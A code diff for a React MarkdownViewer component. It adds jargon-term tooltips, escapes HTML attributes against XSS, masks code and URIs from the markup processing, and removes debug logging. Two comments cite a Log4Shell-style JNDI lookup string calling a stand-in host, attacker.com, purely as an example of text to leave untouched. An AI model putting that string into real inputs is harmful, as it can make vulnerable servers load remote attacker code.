@@ -2,78 +2,138 @@ import { useEffect } from 'react';
 import ReactMarkdown from "react-markdown";
 import remarkGfm from "remark-gfm";
 import rehypeRaw from 'rehype-raw';
+import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from '../ui/tooltip';
 import "../file/MarkdownViewer.css";
-
 
 interface MarkdownViewerProps {
   content: string;
   isUser?: boolean;
 }
 
+/** Strip nested [JARGON_HIGHLIGHT:...] from text to avoid raw syntax in tooltips/XSS */
+function stripNestedJargonSyntax(text: string): string {
+  return text.replace(/\[JARGON_HIGHLIGHT:[^\]]*\]/g, '').replace(/\s+/g, ' ').trim();
+}
+
+/** In code/URI segments, replace [JARGON_HIGHLIGHT:term|desc] with just term so code and URLs render cleanly. */
+function stripJargonSyntaxToTerm(text: string): string {
+  return text.replace(/\[JARGON_HIGHLIGHT:([^|]+)\|[^\]]*\]/g, (_m, term) => term.trim());
+}
+
+/** Escape for HTML attribute to prevent XSS */
+function escapeHtmlAttr(value: string): string {
+  const div = document.createElement('div');
+  div.textContent = value;
+  return div.innerHTML
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+/** Escape for HTML text content (no quotes) so display is correct */
+function escapeHtmlContent(value: string): string {
+  const div = document.createElement('div');
+  div.textContent = value;
+  return div.innerHTML;
+}
+
 const MarkdownViewer = ({ content, isUser = false }: MarkdownViewerProps) => {
-  console.log('🚀 MarkdownViewer component rendered with content:', content.substring(0, 100) + '...');
-  
   // Decode HTML entities in the content
   const decodeHTMLEntities = (text: string) => {
     const textarea = document.createElement('textarea');
     textarea.innerHTML = text;
     return textarea.value;
   };
-  
-  // Clean up malformed jargon syntax
-  const cleanJargonSyntax = (text: string) => {
-    // Don't remove jargon syntax - let processJargonInText handle it
-    return text;
-  };
-  
-  // Process jargon syntax in the entire content before passing to ReactMarkdown
+
+  // Match innermost [JARGON_HIGHLIGHT:term|desc] first (description must not contain another [JARGON_HIGHLIGHT:)
+  const JARGON_INNERMOST_RE = /\[JARGON_HIGHLIGHT:([^|]+)\|((?:(?!\[JARGON_HIGHLIGHT:)[\s\S])*?)\]/g;
+
   const processJargonInContent = (text: string): string => {
-    console.log('🔍 processJargonInContent processing:', text.substring(0, 100) + '...');
-    
-    // Check if text contains jargon syntax
-    const hasJargonSyntax = text.includes('[JARGON_HIGHLIGHT:');
-    console.log('🎯 Has jargon syntax:', hasJargonSyntax);
-    
-    if (!hasJargonSyntax) {
-      console.log('❌ No jargon syntax found, returning original text');
-      return text;
+    if (!text.includes('[JARGON_HIGHLIGHT:')) return text;
+
+    let result = text;
+    let prev = '';
+    while (prev !== result) {
+      prev = result;
+      result = result.replace(JARGON_INNERMOST_RE, (_match, term, description) => {
+        const rawTerm = term.trim();
+        const cleanTerm = rawTerm.replace(/\s*\[JARGON_HIGHLIGHT:\s*/gi, '').trim() || rawTerm;
+        const cleanDesc = stripNestedJargonSyntax(description);
+        const safeTerm = escapeHtmlAttr(cleanTerm);
+        const safeDesc = escapeHtmlAttr(cleanDesc);
+        return `<span class="jargon-highlight" data-jargon data-term="${safeTerm}" data-description="${safeDesc}">${escapeHtmlContent(cleanTerm)}</span>`;
+      });
     }
-    
-    // Replace jargon syntax with simple highlighted text (no tooltips for now)
-    const processedText = text.replace(/\[JARGON_HIGHLIGHT:([^|]+)\|([^\]]+)\]/g, (_match, term, description) => {
-      console.log('🎯 Found jargon match in content:', term, '|', description.substring(0, 50) + '...');
-      
-      // Just return the term with highlighting - no complex HTML
-      return `<span class="jargon-highlight-simple" style="background-color: rgba(59, 130, 246, 0.1); border-bottom: 1px dotted #3b82f6; padding: 0 2px; border-radius: 2px; cursor: pointer;" title="${description.replace(/"/g, '&quot;')}">${term}</span>`;
-    });
-    
-    console.log('📝 processJargonInContent result length:', processedText.length);
-    console.log('📝 processJargonInContent result preview:', processedText.substring(0, 200) + '...');
-    return processedText;
+    // Remove any leftover malformed fragments (e.g. "[JARGON_HIGHLIGHT:Missing " or "[JARGON_HIGHLIGHT:xxx]" with no pipe)
+    result = result.replace(/\[JARGON_HIGHLIGHT:([^|\]]*)\]?/g, (_m, g1) => (g1 || '').trim());
+    return result;
   };
 
-  // Content is already preprocessed by the chat component
-  const processedContent = cleanJargonSyntax(decodeHTMLEntities(content));
-  
-  // Process jargon syntax in the entire content
-  const jargonProcessedContent = processJargonInContent(processedContent);
-  
-  console.log('📄 MarkdownViewer received content:', content.substring(0, 200) + '...');
-  console.log('🔧 MarkdownViewer processed content:', processedContent.substring(0, 200) + '...');
-  console.log('🎨 MarkdownViewer jargon processed content:', jargonProcessedContent.substring(0, 200) + '...');
+  /** Run jargon replacement only outside code blocks, inline code, and URI-like strings so code/URIs are not broken. */
+  const processJargonExcludingCode = (text: string): string => {
+    const codeParts: string[] = [];
+    const placeholder = (i: number) => `\u0000\u0001JARGON_CODE${i}\u0001\u0000`;
 
-  // Debug logging for code block detection
-  useEffect(() => {
-    // Debug logging removed - keeping useEffect for potential future use
-  }, [content]);
+    // 1. Mask fenced code blocks (```...```) so jargon is not applied inside them
+    let out = text.replace(/```[\s\S]*?```/g, (m) => {
+      const i = codeParts.length;
+      codeParts.push(m);
+      return placeholder(i);
+    });
+    // 2. Mask inline code (`...`) so jargon is not applied inside (e.g. `${JNDI:LDAP://attacker.com/exploit}`)
+    out = out.replace(/`(?:[^`\\]|\\.)*`/g, (m) => {
+      const i = codeParts.length;
+      codeParts.push(m);
+      return placeholder(i);
+    });
+    // 3. Mask URI-like segments (contain ://) so jargon isn't applied inside (e.g. JNDI:LDAP://attacker.com/exploit or https://...)
+    out = out.replace(/\S+:\/\/\S+/g, (m) => {
+      const i = codeParts.length;
+      codeParts.push(m);
+      return placeholder(i);
+    });
+
+    out = processJargonInContent(out);
+
+    // Restore masked segments; strip any jargon syntax inside them so code/URIs render as plain text
+    codeParts.forEach((part, i) => {
+      out = out.replace(placeholder(i), stripJargonSyntaxToTerm(part));
+    });
+    return out;
+  };
+
+  const processedContent = decodeHTMLEntities(content);
+  const jargonProcessedContent = processJargonExcludingCode(processedContent);
+
+  useEffect(() => {}, [content]);
 
   return (
     <div className={`prose text-sm ${isUser ? 'prose-invert' : 'prose-gray'} max-w-none prose-pre:my-0 prose-pre:rounded-md prose-headings:mb-3 prose-headings:mt-4 prose-p:mb-3 prose-p:leading-relaxed prose-li:my-0 prose-li:leading-relaxed prose-h1:mb-4 prose-h2:mb-3 prose-h3:mb-2 overflow-x-hidden break-words hyphens-auto w-full prose-p:break-words prose-li:break-words`}>
+      <TooltipProvider delayDuration={200} skipDelayDuration={0}>
       <ReactMarkdown
         remarkPlugins={[remarkGfm]}
         rehypePlugins={[rehypeRaw]}
         skipHtml={false}
         components={{
+          span({ node, children, className, ...props }: any) {
+            const dataJargon = props['data-jargon'] ?? node?.properties?.['data-jargon'];
+            const description = props['data-description'] ?? node?.properties?.['data-description'];
+            if (dataJargon != null && description != null) {
+              const { 'data-jargon': _dj, 'data-term': _dt, 'data-description': _dd, ...restProps } = props;
+              return (
+                <Tooltip>
+                  <TooltipTrigger asChild>
+                    <span className={`jargon-highlight ${className || ''}`.trim()} {...restProps}>
+                      {children}
+                    </span>
+                  </TooltipTrigger>
+                  <TooltipContent side="top" align="center" className="max-w-xs text-left">
+                    <p className="text-xs leading-relaxed whitespace-normal">{description}</p>
+                  </TooltipContent>
+                </Tooltip>
+              );
+            }
+            return <span className={className} {...props}>{children}</span>;
+          },
           // Custom pre component to handle code blocks properly
           pre({ children, ...props }: any) {
             // Check if this pre is inside a paragraph (which would be invalid)
@@ -193,6 +253,7 @@ const MarkdownViewer = ({ content, isUser = false }: MarkdownViewerProps) => {
       >
         {jargonProcessedContent}
       </ReactMarkdown>
+      </TooltipProvider>
     </div>
   );
 };
